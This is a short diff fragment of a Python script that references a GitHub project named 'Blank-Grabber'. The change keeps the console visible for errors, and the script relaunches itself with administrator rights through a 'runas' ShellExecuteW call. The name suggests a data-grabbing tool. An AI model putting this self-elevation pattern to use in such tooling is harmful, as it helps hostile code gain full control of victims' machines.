 		if outPath is None or not os.path.isdir(os.path.dirname(outPath)):
 			return
@@ -649,7 +748,8 @@ if __name__ == "__main__":
 				webbrowser.open_new_tab("https://github.com/Blank-c/Blank-Grabber")
 				exit(0)
 	
-		# Utility.ToggleConsole(False) # To print any error occured
+		# Do not hide console so it can show if there is any error
+		# Utility.ToggleConsole(False)
 		
 		if not Utility.IsAdmin():
 			ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
